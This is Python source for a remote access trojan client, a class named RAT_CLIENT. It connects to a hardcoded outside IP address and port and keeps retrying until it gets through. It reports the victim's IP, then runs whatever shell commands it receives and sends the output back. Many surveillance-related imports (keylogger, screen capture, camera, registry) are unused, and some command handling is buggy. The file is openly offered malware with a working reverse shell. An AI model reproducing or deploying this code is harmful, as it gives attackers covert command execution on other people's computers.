import random
import socket, subprocess, os, platform
from threading import Thread
from PIL import Image
from datetime import datetime
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from winreg import *
import shutil
import glob
import ctypes
import sys
import webbrowser
import re
import pyautogui
import cv2
import urllib.request
import json
from pynput.keyboard import Listener
from pynput.mouse import Controller
import time
import keyboard

user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()

    def build_connection(self):
        connected = False
        global s
        while not connected:  
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.host, self.port)) ##
                sending = socket.gethostbyname(socket.gethostname())
                s.send(sending.encode())
                command = s.recv(1024).decode()
                if command == 'recibido':
                    connected = True
                    print("Connect Establish")
            except socket.error as e:
                print("Attempting to connect...")
                time.sleep(50)
            
    
    def errorsend(self):
        output = bytearray("no output", encoding='utf8')
        for i in range(len(output)):
            output[i] ^= 0x41
        s.send(output)
    
    
    def execute(self):
        while True:
            command = s.recv(1024).decode()
            if command == 'shell':
                a=1;
                print (a);
                while a==1:
                    command = s.recv(1024).decode()
                    if command.lower() == 'exit' :
                        a=0;
                    if command == 'cd':
                        os.chdir(command[3:].decode('utf-8'))
                        dir = os.getcwd()
                        dir1 = str(dir)
                        s.send(dir1.encode())
                    output = subprocess.getoutput(command)
                    s.send(output.encode())
                    if not output:
                        self.errorsend()

            elif command == 'exitt':
                s.send(b"exit")
                s.close()
                break

rat = RAT_CLIENT('138.68.79.95', 1431)

if __name__ == '__main__':
    rat.build_connection()
    rat.execute()
